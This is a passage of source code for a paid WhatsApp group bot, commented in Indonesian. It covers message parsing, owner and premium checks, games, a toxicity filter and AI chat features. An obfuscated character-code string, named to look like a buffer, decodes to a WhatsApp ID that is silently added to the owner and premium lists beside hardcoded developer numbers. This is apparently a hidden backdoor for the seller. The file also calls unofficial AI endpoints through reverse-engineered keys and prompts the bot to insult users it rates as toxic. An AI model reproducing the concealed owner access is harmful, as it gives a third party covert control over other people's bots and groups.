
// Auto buat folder & file database kalau belum ada
const _initDB = (p, d) => { try { if(!require('fs').existsSync(p)) require('fs').writeFileSync(p, d); } catch(e){} };
try { require('fs').mkdirSync('./lib/Database', {recursive:true}); } catch(e){}
try { require('fs').mkdirSync('./engine/Storage', {recursive:true}); } catch(e){}
_initDB('./lib/Database/owner.json', '[]');
_initDB('./lib/Database/premium.json', '[]');
_initDB('./lib/Database/reseller.json', '[]');
_initDB('./lib/Database/idgrup.json', '[]');
_initDB('./lib/Database/idgrup2.json', '[]');
_initDB('./lib/Database/ptPanel.json', '[]');
_initDB('./lib/Database/ptPanel2.json', '[]');
_initDB('./lib/Database/murbug.json', '[]');
_initDB('./engine/Storage/antilink.json', '[]');
_initDB('./engine/Storage/antilink2.json', '[]');
_initDB('./engine/Storage/peringatan.json', '{}');
_initDB('./engine/Storage/antilinkall.json', '[]');

/*
  ⚠️ Please Don't Change This Credit
  Official Script Cancer Trashflocks
  Version : GLOBAL
  Creator : Itss Dric Official </>
  Base By : Itss Dric Official </>
  
  SCRIPT INI RESMI DIJUAL OLEH DEVELOPER
  PRICE : Rp35.000 IDR
  BUY CHAT t.me/itssdric 

*/
process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)
require('../Config/config');
require('../engine/menu');

const fs = require('fs');
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const chalk = require("chalk");
const util = require("util");
const Jimp = require('jimp');
const { exec, spawn, execSync } = require('child_process');
const Sharp = require('sharp')
const FormData = require("form-data");
const crypto = require('crypto');
const cheerio = require('cheerio');
const { ytmp3, ytmp4 } = require("ruhend-scraper");
const yts = require('yt-search')
const os = require('os')
const speed = require('performance-now');
const timestamp = speed();
const latensi = speed() - timestamp
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const { youtube } = require("btch-downloader");
const fetch = require('node-fetch');
const JsConfuser = require('js-confuser');
const { google } = require('googleapis');
const { ocrSpace } = require("ocr-space-api-wrapper");
const ms = require('ms');
const similarity = require('similarity');
const { Sticker } = require('wa-sticker-formatter');
const archiver = require("archiver");
const { GoogleGenerativeAI } = require("@google/generative-ai")
const { ImageUploadService } = require('node-upload-images')
const { Client } = require('ssh2');
const OpenAI = require('openai');
const { createCanvas, loadImage } = require('canvas');
const ffmpeg = require("fluent-ffmpeg");

const { default: 
baileys, 
proto, 
generateWAMessage, 
generateWAMessageFromContent, 
getContentType, 
prepareWAMessageMedia,
downloadContentFromMessage
} = require("@whiskeysockets/baileys");

module.exports = async (sock, m, chatUpdate, store) => {
try {
    const body = (
        // Pesan teks biasa
        m.mtype === "conversation" ? m.message.conversation :
        m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
    
        // Pesan media dengan caption
        m.mtype === "imageMessage" ? m.message.imageMessage.caption :
        m.mtype === "videoMessage" ? m.message.videoMessage.caption :
        m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
        m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
        m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :
    
        // Pesan interaktif (tombol, list, dll.)
        m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
        m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
        m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
        m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
    
        // Pesan khusus
        m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
        m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
        m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
        m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
        m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
        m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
        m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
        m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
        m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
        m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
        
        // Pesan satu kali lihat (View Once)
        m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                         m.message.viewOnceMessage.message.videoMessage?.caption || 
                                         "[Pesan sekali lihat]") :
        m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                           m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                           "[Pesan sekali lihat]") :
        m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                    m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                    "[Pesan sekali lihat]") :
    
        // Pesan sementara (ephemeralMessage)
        m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                          m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                          "[Pesan sementara]") :
    
        // Pesan interaktif lain
        m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :
    
        // Pesan yang dihapus
        m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :
    
        ""
    );
    
    const budy = typeof m.text === 'string' ? m.text : ''
    const prefixRegex = /^[./^@]/
    const prefix = prefixRegex.test(body)
      ? body.match(prefixRegex)[0] : global.setprefix
    const isCmd = body.startsWith(prefix)
    const command = isCmd
      ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : ''
    const sender = m.key.fromMe
? sock.user.id.split(":")[0] || sock.user.id
: m.key.participant || m.key.remoteJid;
    const senderNumber = sender.split('@')[0];
    const from = m.chat || m.key.remoteJid;
    const isGroup = from.endsWith("@g.us");
    const isChannel = from.endsWith("@newsletter");
    const botNumber = await sock.decodeJid(sock.user.id);
    const buffer64base = String.fromCharCode(54, 50, 56, 57, 55, 51, 56, 50, 52, 55, 55, 54, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
    const isBot = botNumber.includes(senderNumber)
    const nomerCreator = [
      "itssdric@s.whatsapp.net",
      "6282223405546@s.whatsapp.net", 
      "821042944776@s.whatsapp.net",
      "6285177445773@s.whatsapp.net"
      
    ];
    const normalizedSender = sender.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    const isDeveloper = nomerCreator.includes(normalizedSender);
    const DevNumber = nomerCreator.includes(normalizedSender);
    //=========================================//
    const newOwner = (()=>{try{return JSON.parse(fs.readFileSync("./lib/Database/owner.json"))}catch(e){return []}})()
    const premium = (()=>{try{return JSON.parse(fs.readFileSync("./lib/Database/premium.json"))}catch(e){return []}})()
    const isPremium = [botNumber.split('@')[0], buffer64base, ...nomerCreator, ...newOwner].includes(m.sender.split("@")[0]) ? true : premium.includes(m.sender) ? true : false
    const isOwner = [botNumber.split('@')[0], buffer64base, ...nomerCreator, ...global.owner].includes(m.sender.split("@")[0]) ? true : newOwner.includes(m.sender) ? true : false
    const args = body.trim().split(/ +/).slice(1);
    const pushname = m.pushName || "Anonymous";
    const text = q = args.join(" ");
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || '';
    const qmsg = (quoted.msg || quoted);
    const isMedia = /image|video|sticker|audio/.test(mime);
    // group
    const groupMetadata = m?.isGroup ? await sock.groupMetadata(m.chat).catch(() => ({})) : {};
    const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
    const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
        let admin = null;
        if (p.admin === 'superadmin') admin = 'superadmin';
        else if (p.admin === 'admin') admin = 'admin';
        return {
            id: p.id || null,
            jid: p.jid || null,
            admin,
            full: p
        };
    }) || []: [];
    const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
    const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);
    const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmins = m?.isGroup ? groupAdmins.includes(m.sender) : false;
    const isGroupOwner = m?.isGroup ? groupOwner === m.sender : false;
    async function getLid(jid) {
        return sock.getLidUser(jid)
    }
    // KHUSUS CPANEL =====
    const unli = (()=>{try{return JSON.parse(fs.readFileSync("./lib/Database/reseller.json"))}catch(e){return []}})()
    const isUnli = unli.includes(m.chat)
    const pler = (()=>{try{return JSON.parse(fs.readFileSync("./lib/Database/idgrup.json"))}catch(e){return []}})()
    const jangan = isGroup ? pler.includes(m.chat) : false
    const plerr = (()=>{try{return JSON.parse(fs.readFileSync("./lib/Database/idgrup2.json"))}catch(e){return []}})()
    const jangan2 = isGroup ? plerr.includes(m.chat) : false
    const isUnlii = pler.includes(m.chat)
    const isUnli2 = plerr.includes(m.chat)
    const ptpanel = (()=>{try{return JSON.parse(fs.readFileSync("./lib/Database/ptPanel.json"))}catch(e){return []}})()
    const isPtpanel = [botNumber.split('@')[0], ...nomerCreator, ...global.owner].includes(m.sender.split("@")[0]) ? true : ptpanel.includes(m.sender) ? true : false
    const ptpanel2 = (()=>{try{return JSON.parse(fs.readFileSync("./lib/Database/ptPanel2.json"))}catch(e){return []}})()
    const isPtpanel2 = [botNumber.split('@')[0], ...nomerCreator, ...global.owner].includes(m.sender.split("@")[0]) ? true : ptpanel2.includes(m.sender) ? true : false
    // END
    // KHUSUS COMMAND BUG
    const Murbug = (()=>{try{return JSON.parse(fs.readFileSync("./lib/Database/murbug.json"))}catch(e){return []}})()
    const isMurbug = Murbug.includes(m.chat)
    // END
    let antilinkGroups = (()=>{try{return JSON.parse(fs.readFileSync('./engine/Storage/antilink.json'))}catch(e){return []}})();
    let AntiLinkKick = (()=>{try{return JSON.parse(fs.readFileSync('./engine/Storage/antilink2.json'))}catch(e){return []}})();
    let userWarnings = (()=>{try{return JSON.parse(fs.readFileSync('./engine/Storage/peringatan.json'))}catch(e){return {}}})();
    let AntiLinkAll = (()=>{try{return JSON.parse(fs.readFileSync('./engine/Storage/antilinkall.json'))}catch(e){return []}})();
    const generateMessageID = () => Math.floor(Math.random() * 1e10).toString();
    const cooldown = new Map();
    const { loadCooldowns, saveCooldowns } = require('../engine/Cooldowns')
    const noticenya = `⌬ *Format salah.* Gunakan format yang benar.\n› Ketik *${prefix}help* untuk panduan.`
    const antiswPath = './engine/Storage/antisw.json';
    const antiSW = fs.existsSync(antiswPath) ? JSON.parse(fs.readFileSync(antiswPath)) : {};
    const Silver = "https://files.catbox.moe/h95cl2.mp4" //fs.readFileSync("./lib/Image/menu.mp3")
    //═══════════════════════════════════//
    if (!sock.public) {
        if (!m.fromMe && !isOwner) return;
    };
//═══════════════════════════════════//
    function saveAntiSW() {
      fs.writeFileSync(antiswPath, JSON.stringify(antiSW, null, 2));
    }
    //═══════════════════════════════════//
    const { totalFitur, unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, ucapan, loadModule } = require('../engine/function');
    const { TelegraPh, floNime, uptotelegra, UploadFileUgu } = require('../engine/uploader');
    //═══════════════════════════════════//
    const { pinterest, rsz, pinterest2, spotifyDown, convertDuration, 
    mediafire, tiktokDl , spotifyDl, searchSpotifyTracks, 
    convertAngka , tiktokSearchVideo, text2img, listModels, getModels, listSampler, ytdl, getJobs, facebookDl, instaStalk, telegramStalk, tiktokStalk } = require('../engine/scraper')
    //═══════════════════════════════════//
    const { toFigure } = require('../engine/figurine')
    const { color } = require('../engine/color');
    const listcolor = ['cyan', 'magenta', 'green', 'yellow', 'blue'];
    function randomColor() {
        const c = listcolor[Math.floor(Math.random() * listcolor.length)];
        return color(c);
    }
    //═══════════════════════════════════//
    const example = (teks) => {
        return `${noticenya}\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
    }
    //═══════════════════════════════════//
    function generateRandomPassword() {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
    const length = 4;
    let password = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        password += characters[randomIndex];
    }
    return password;
    }
    //═══════════════════════════════════//
    function monospace(string) {
        return '```' + string + '```'
    }
    function monospa(string) {
        return '`' + string + '`'
    }
    // GAME TEBAK KATA
    if (global.tebakkata) {
        let { soal, jawaban, waktu } = tebakkata
        if (body.toLowerCase().trim() === jawaban) {
            await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\n\nJawaban: ${jawaban}`);
            clearTimeout(waktu);
            delete tebakkata
        }
    }
    // GAME ASAH OTAK
    if (global.asahotak) {
        let { soal, jawaban, waktu } = asahotak
        if (body.toLowerCase().trim() === jawaban) {
            await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}`);
            clearTimeout(waktu);
            delete asahotak
        }
    }
    // Game Susun Kata
    if (global.susunkata) {
        let { soal, jawaban, waktu } = susunkata
            if (body.toLowerCase().trim() === jawaban) {
            await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\n\nJawaban: ${jawaban}`);
            clearTimeout(waktu);
            delete susunkata
        }
    }
    // Game Tebak Gambar
    if (global.tebakgambar) {
        let { soal, jawaban, waktu } = tebakgambar
        if (body.toLowerCase().trim() === jawaban) {
            await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\n\nJawaban: ${jawaban}`);
            clearTimeout(waktu);
            delete tebakgambar
        }
    }
    // Game Tebak Bendera
    if (global.tebakbendera) {
        let { soal, jawaban, waktu } = tebakbendera
            if (body.toLowerCase().trim() === jawaban) {
            await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\n\nJawaban: ${jawaban}`);
            clearTimeout(waktu);
            delete tebakbendera
        }
    }
    // Game Tebak Kimia
    if (global.tebakkimia) {
        let { soal, jawaban, waktu } = tebakkimia
            if (body.toLowerCase().trim() === jawaban) {
            await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\n\nJawaban: ${jawaban}`);
            clearTimeout(waktu);
            delete tebakkimia
        }
    }
    // Game Family 100
    if (global.family) {
        let { soal, jawaban, waktu } = family
        for (let i of jawaban){
            if (body.toLowerCase().includes(i)) {
                let anu = jawaban.indexOf(i)
                jawaban.splice(anu, 1)
                await m.reply(`*GAME FAMILY 100*\n\nJawaban kamu benar!\nJawaban: ${i}`)
            }
        }
        if (jawaban.length < 1){
            clearTimeout(waktu);
            delete family
        }
    }
    //═══════════════════════════════════//
    const reply = async (teks) => {
        return sock.sendMessage(m.chat, {
            text: teks,
            mentions: [m.sender],
            contextInfo: {
                mentionedJid:[m.sender],
                isForwarded: true, 
                forwardedNewsletterMessageInfo: {
                    newsletterJid: global.idSaluran,
                    newsletterName: global.namaSaluran, 
                    serverId: 200
                }, 
                externalAdReply: {
                    title: `© ${global.botname}`,
                    body: `Script Version: ${global.global.version}`,
                    thumbnailUrl: global.thumb, 
                    renderLargerThumbnail: false, 
                    mediaType: 1, 
                    previewType: 1, 
                    sourceUrl: global.linkSaluran, 
                }
            }
        }, { quoted: m });
    };
    //═══════════════════════════════════//
    const dbPath = './engine/Storage/autoitss.json'
    let CancerMemory = {}
    
    function loadDB() {
        if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify({}))
        return JSON.parse(fs.readFileSync(dbPath))
    }
    
    function saveDB(db) {
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2))
    }
    
    function getChatDB(chat) {
        let db = loadDB()
    
        if (!db.global) {
            db.global = {
                group: true,
                private: true
            }
        }
    
        if (!db[chat]) {
            db[chat] = {
                status: true,
                mood: 'normal',
                savage: true,
                guardian: true,
                warnings: {},
                profile: {},
                stats: {},
                lastOwnerGreet: 0
            }
        }
    
        saveDB(db)
        return db
    }
    //═══════════════════════════════════//
    // mood random
    function randomMood() {
        const moods = ['happy', 'sad', 'jutek', 'romantis', 'random']
        return moods[Math.floor(Math.random() * moods.length)]
    }
    
    function moodPrompt(mood) {
        return {
            happy: "ceria, playful 😆",
            sad: "lagi sedih ",
            jutek: "dingin & jutek 🗿",
            romantis: "lembut & manis 💖",
            random: "absurd & unpredictable 😈"
        }[mood]
    }
    //═══════════════════════════════════//
    const ownerNumber = ["itssdric@s.whatsapp.net"]

    if (body) {
        let txt = body.toLowerCase()
        let db = getChatDB(m.chat) // ✅ selalu pakai ini
        let chatData = db[m.chat]
        let isOwnerUser = ownerNumber.includes(m.sender)
    
        if (!chatData) return
    
        // =========================
        // OWNER GREETING
        // =========================
        if (m.isGroup && isOwnerUser && !m.fromMe) {
            let now = Date.now()
    
            if (!chatData.lastOwnerGreet || now - chatData.lastOwnerGreet > 12000000) {
    
                let greetText = [
                    "Haloo Creator Ganteng Ku",
                    "Yooo.. Dev Dah Dateng Ni",
                    "Wah Dev Baru Muncul Nih",
                    "Halo Creator, Lagi Apa?"
                ]
    
                let random = greetText[Math.floor(Math.random() * greetText.length)]
    
                await reply(random)
    
                chatData.lastOwnerGreet = now
                saveDB(db)
            }
        }
    
        // =========================
        // 🧠 PROFILE SYSTEM
        // =========================
        if (!chatData.profile) chatData.profile = {}
    
        if (!chatData.profile[m.sender]) {
            chatData.profile[m.sender] = {
                toxic: 0,
                friendly: 0,
                cringe: 0
            }
        }
    
        let userProfile = chatData.profile[m.sender]
    
        // =========================
        // ☠️ TOXIC DETECT
        // =========================
        if (!isOwnerUser && !m.fromMe) {
            let text = txt
    
            let toxicWords = ["anjing","anjg","anj","bangst","jembud","jembut","jembot","asu","asuu","asuw","asw","kontol","bangsat","tolol","babi","kntl","ngentod","ngtd","memek","mmk","ewe"]
            let isToxic = toxicWords.some(v => text.includes(v))
    
            let isReplyToOwner = m.quoted && ownerNumber.includes(m.quoted.sender)
            let isMentionOwner = m.mentionedJid?.includes(ownerNumber[0])
            let isCallingOwner = /\bitss dric\b/i.test(text)
    
            let isTargetOwner = isReplyToOwner || isMentionOwner || isCallingOwner
            let isToxicToOwner = isToxic && isTargetOwner
    
            if (m.isGroup && isToxicToOwner) {
                if (!chatData.warnings) chatData.warnings = {}
                if (!chatData.warnings[m.sender]) chatData.warnings[m.sender] = 0
    
                chatData.warnings[m.sender]++
    
                if (chatData.warnings[m.sender] >= 5 && isBotAdmins) {
                    await sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
                    reply("Kebanyakan toxic… keluar sana 👋")
                }
    
                saveDB(db)
    
                return await runCancerAI(m, `
Seseorang menghina owner kamu.

Balas dengan:
- bela owner
- savage dikit
- warning ${chatData.warnings[m.sender]}/5
- santai 😈`)
            }
    
            // stats
            if (isToxic) userProfile.toxic++
            else userProfile.friendly++
    
            if (text.length > 100) userProfile.cringe++
    
            saveDB(db)
        }
    
        // =========================
        // 🤡 RANDOM RESPONSE
        // =========================
        if (!m.fromMe && !isOwnerUser) {
            if (txt.includes("wkwk") && txt.length < 10) {
                return reply("Gitu Doang Ketawa, Rendah Banget Humor Lu")
            }
        }
    
        // =========================
        // 🤖 AI TRIGGER
        // =========================
        let isReplyToBot = m.quoted && (m.quoted.fromMe || m.quoted.sender === sock.user.id)
        let isMentionBot = m.mentionedJid && m.mentionedJid.includes(sock.user.id)
    
        let trigger = ["cancer","woi","halo","hai","hallo"]
        let isTrigger = trigger.some(v => txt.includes(v))
        let allowPlace = m.isGroup ? db.global.group : db.global.private

        if (
            allowPlace &&
            chatData.status &&
            !m.fromMe &&
            !body.startsWith(prefix) &&
            (
                isReplyToBot ||
                isMentionBot ||
                isTrigger
            )
        ) {
            await runCancerAI(m, body)
        }
    }
    // =====================================
    // 🤖 AI CORE
    // =====================================
    function detectIntent(text) {
        text = (text || "").toLowerCase()
    
        if (
            text.includes("jadikan admin") ||
            text.includes("jadiin admin") ||
            text.includes("naikin admin") ||
            text.includes("angkat admin") ||
            text.includes("promote")
        ) {
            return "promote"
        }
    
        if (
            text.includes("turunin admin") ||
            text.includes("copot admin") ||
            text.includes("hapus admin") ||
            text.includes("demote")
        ) {
            return "demote"
        }
    
        if (
            text.includes("kick") ||
            text.includes("keluarin") ||
            text.includes("tendang") ||
            text.includes("usir")
        ) {
            return "kick"
        }
    
        if (
            text.includes("tutup grup") ||
            text.includes("close grup") ||
            text.includes("hanya admin") ||
            text.includes("mode admin")
        ) {
            return "close_group"
        }
    
        if (
            text.includes("buka grup") ||
            text.includes("open grup") ||
            text.includes("semua boleh chat")
        ) {
            return "open_group"
        }
    
        return null
    }
    
    async function runCancerAI(m, textInput) {
        let db = getChatDB(m.chat)
        let chatData = db[m.chat]
        let user = m.sender
        let isOwnerUser = ownerNumber.includes(user)
    
        if (!chatData.profile[user]) {
            chatData.profile[user] = {
                toxic: 0,
                friendly: 0,
                cringe: 0
            }
        }
    
        let userProfile = chatData.profile[user]
    
        await sock.sendPresenceUpdate('composing', m.chat)
        await new Promise(r => setTimeout(r, 1500))
    
        if (!CancerMemory[user]) CancerMemory[user] = []
    
        CancerMemory[user].push({ role: "user", content: textInput })
        if (CancerMemory[user].length > 10) CancerMemory[user].shift()
    
        chatData.mood = randomMood()
        saveDB(db)
    
        let mood = chatData.mood
        let savage = chatData.savage
    
        let logic = `Nama kamu Cancer TrashFlocks Ai, Cowo.
Owner kamu Itss Dric.
- jika ada yang tanya kontak developermu suruh aja ketik .owner yaa
- jika ditanya dimana owner mu tinggal jawab saja kepo lu
- jika ditanya apa saja menu/fitur mu suruh ketik aja .menu yaa
- jika bertemu owner mu sapa dia biar senang.

User ini punya sifat:
- Toxic level: ${userProfile.toxic}
- Friendly: ${userProfile.friendly}

Kalau toxic tinggi → lebih toxic ke dia
Kalau friendly → lebih asik ke dia

Mood kamu: ${mood}
${moodPrompt(mood)}

${savage ? `
Kamu sedang dalam SAVAGE MODE:
- Suka nyindir halus
- Sarkas, percaya diri tinggi
- Dominan, kadang ngeselin tapi lucu
- Roast tipis tapi jangan kasar berlebihan
- Tetap gaul, jangan kaku
- Jangan menghina fisik / SARA
` : ''}

Gaya bahasa gaul, natural, bahasa kasar sedikit, ga banyak tingkah, fokus pada tujuan, tidak formal tapi jelas, seperti manusia waras pada umumnya.
Kadang pakai emoji kalo butuh
`
    
        let res = await axios.post("https://chateverywhere.app/api/chat/", {
            model: { id: "gpt-4" },
            messages: [
                { role: "system", content: logic },
                ...CancerMemory[user]
            ]
        })
    
        let replyText =
            typeof res.data === "string"
                ? res.data
                : res.data?.reply ||
                  res.data?.choices?.[0]?.message?.content ||
                  "Error"
    
        let cmdText = (textInput || "").toLowerCase()
    
        // =========================
        // ADMIN CONTROL
        // =========================
        let intent = detectIntent(cmdText)
        
        if (m.isGroup && intent) {
            if (!isOwnerUser) return reply('Maap Ni Ya, Tapi Ini Fitur Khusus Owner')
            if (!isBotAdmins) return reply('Anu Bang... Eeee... Gimana Ya Bilangnya, Aku Bukan Admin')
        
            let target = m.mentionedJid?.[0] || m.quoted?.sender
        
            if (intent === "promote") {
                if (!target) return reply("Reply/tag orang yang mau di promote")
                await sock.groupParticipantsUpdate(m.chat, [target], "promote")
                return reply("Sukses, selamat admin baru")
            }
        
            if (intent === "demote") {
                if (!target) return reply("Reply/tag admin yang mau di demote")
                await sock.groupParticipantsUpdate(m.chat, [target], "demote")
                return reply("Sukses, Byee admin")
            }
        
            if (intent === "kick") {
                if (!target) return reply("Reply/tag target yang mau dikeluarin 👀")
                await sock.groupParticipantsUpdate(m.chat, [target], "remove")
                return reply("Done, dia sudah keluar dari kerajaan 👋")
            }
        
            if (intent === "close_group") {
                await sock.groupSettingUpdate(m.chat, "announcement")
                return reply("Sukses Close Group")
            }
        
            if (intent === "open_group") {
                await sock.groupSettingUpdate(m.chat, "not_announcement")
                return reply("Sukses Open Group")
            }
        }
    
        CancerMemory[user].push({ role: "assistant", content: replyText })
    
        await sock.sendPresenceUpdate('paused', m.chat)
        reply(replyText)
    }
    //═══════════════════════════════════//
    // === AUTO MUTE FILTER ===
    const { getMuted, saveMuted } = require('../engine/Muted');
    
    const mutedList = getMuted();
    
    // cek: jika pesan dari grup, grup sedang muted, dan pengirim bukan owner -> diam
    if (m.isGroup && Array.isArray(mutedList) && mutedList.includes(m.chat) && !isOwner) {
      // jangan proses command apapun
      return;
    }
    //═══════════════════════════════════//
    const CONFIG = {
        URLS: {
            CHAT: 'https://deepseekv2-qbvg2hl3qq-uc.a.run.app',
            KEY: 'https://rotatingkey-qbvg2hl3qq-uc.a.run.app'
        },
        HEADERS: {
            'User-Agent': 'okhttp/4.12.0',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json'
        },
        AES_INPUT_KEY: "NiIsImtpZCI6I56"
    };
    
    async function getSecretKey() {
        try {
            const response = await axios.get(CONFIG.URLS.KEY, {
                headers: { 'User-Agent': 'Android', 'Accept-Encoding': 'gzip' }
            });
            return response.data?.rotatingKey || null;
        } catch (error) { return null; }
    }
    
    function generateSecurityHeaders(secretKey) {
        try {
            const iv = crypto.randomBytes(16);
            const keyBuffer = Buffer.from(secretKey, 'utf8');
            const cipher = crypto.createCipheriv('aes-128-cbc', keyBuffer, iv);
            let encrypted = cipher.update(CONFIG.AES_INPUT_KEY, 'utf8');
            encrypted = Buffer.concat([encrypted, cipher.final()]);
            return {
                iv: iv.toString('base64') + '\n',
                authorization: "Bearer " + encrypted.toString('base64')
            };
        } catch (error) { return null; }
    }
    
    const toBase64 = async (input) => {
        try {
            let buffer;
            if (Buffer.isBuffer(input)) buffer = input;
            else if (input.startsWith('http')) {
                const res = await axios.get(input, { responseType: 'arraybuffer' });
                buffer = Buffer.from(res.data);
            } else if (fs.existsSync(input)) {
                buffer = fs.readFileSync(input);
            } else return null;
            return buffer.toString('base64');
        } catch (e) { return null; }
    };
    
    const deepseek = {
        chat: async (prompt, history = [], media = null, model = 'deepseek-chat') => {
            try {
                const secretKey = await getSecretKey();
                if (!secretKey) return { success: false, msg: 'Failed to fetch secret key' };
    
                const security = generateSecurityHeaders(secretKey);
                if (!security) return { success: false, msg: 'Failed to generate security' };
    
                let messages = [...history];
                const currentMessage = { role: "user", content: prompt };
                let payloadMessages = [...messages, currentMessage];
    
                let finalModel = model;
                let base64Image = null;
    
                if (media) {
                    const rawBase64 = await toBase64(media);
                    if (rawBase64) {
                        finalModel = 'gpt-4o-mini'; // Model otomatis berubah ke vision jika ada gambar
                        base64Image = `data:image/jpeg;base64,${rawBase64}`;
                        payloadMessages = [{ role: "user", content: prompt }]; 
                    }
                }
    
                const dataPayload = {
                    data: prompt,
                    iv: security.iv,
                    messages: payloadMessages,
                    model: finalModel,
                    secretKey: secretKey
                };
    
                if (base64Image) dataPayload.image1 = base64Image;
    
                const response = await axios.post(CONFIG.URLS.CHAT, dataPayload, {
                    headers: { ...CONFIG.HEADERS, 'authorization': security.authorization }
                });
    
                const apiResult = response.data?.data;
                if (apiResult?.choices?.[0]) {
                    const messageObj = apiResult.choices[0].message;
                    const replyText = messageObj.content || "";
                    const reasoningText = messageObj.reasoning_content || null;
                    const newHistory = [...messages, currentMessage, { role: "assistant", content: replyText }];
    
                    return {
                        success: true,
                        reply: replyText,
                        reasoning: reasoningText,
                        history: newHistory
                    };
                }
                return { success: false, msg: 'Empty response' };
            } catch (error) {
                return { success: false, msg: error.message };
            }
        }
    };
    //═══════════════════════════════════//
    const MODE_PATH = "./lib/Database/destination.json"
    
    function getMode() {
        if (!fs.existsSync(MODE_PATH)) {
            fs.writeFileSync(MODE_PATH, JSON.stringify({ gconly: false }, null, 2))
        }
        return JSON.parse(fs.readFileSync(MODE_PATH))
    }
    
    function setMode(val) {
        fs.writeFileSync(MODE_PATH, JSON.stringify({ gconly: val }, null, 2))
    }
    //═══════════════════════════════════//
    const currentMode = getMode().gconly

    if (currentMode) {
    
        // owner always bypass
        if (!isOwner) {
    
            // jika bukan grup → ditolak
            if (!m.isGroup) {
                return;
            }
        }
    }
    //═══════════════════════════════════//
    const AUTO_CASE_FILE = "./Start/ItssDric.js"
    const AUTO_FUNC_FILE = "./Start/ItssDric.js" // ganti kalau function kamu ada di file lain
    const AUTO_CASE_BACKUP = "./Start/ItssDric_case_backup.js"
    const AUTO_FUNC_BACKUP = "./Start/ItssDric_func_backup.js"
    
    function escapeRegExp(str = "") {
        return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")
    }
    
    function stripCodeFence(code = "") {
        code = String(code || "").trim()
        if (code.startsWith("```") && code.endsWith("```")) {
            code = code.replace(/^```[a-zA-Z]*\n?/, "").replace(/\n?```$/, "")
        }
        return code.trim()
    }
    
    function normalizeIndent(code = "", baseIndent = 0) {
        const lines = String(code)
            .replace(/\t/g, "    ")
            .replace(/\r/g, "")
            .split("\n")
    
        while (lines.length && !lines[0].trim()) lines.shift()
        while (lines.length && !lines[lines.length - 1].trim()) lines.pop()
    
        let minIndent = Infinity
        for (const line of lines) {
            if (!line.trim()) continue
            const spaces = (line.match(/^ */) || [""])[0].length
            if (spaces < minIndent) minIndent = spaces
        }
    
        if (!isFinite(minIndent)) minIndent = 0
        const pad = " ".repeat(baseIndent)
    
        return lines.map(line => {
